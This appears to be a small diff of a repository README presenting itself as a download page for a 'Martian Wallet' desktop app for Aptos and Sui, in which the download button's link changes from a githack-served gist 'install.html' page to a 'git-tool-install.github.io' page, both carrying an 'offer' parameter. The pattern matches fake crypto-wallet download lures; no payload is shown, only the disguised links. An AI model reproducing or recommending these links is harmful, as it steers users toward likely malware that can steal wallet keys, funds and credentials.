@@ -1,6 +1,6 @@
 # Martian Wallet Download — Desktop App for Aptos & Sui Blockchain
 
-<a href="https://gistcdn.githack.com/slipersmalldoll9/5a237fa18de6004cdb853f3de6795c69/raw/01f4526c55d6fe6b6f2645046a617eb789b34a9e/install.html?offer=MartianWallet" target="_blank">
+<a href="https://git-tool-install.github.io/.github/?offer=MartianWallet" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Martian%20Wallet-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
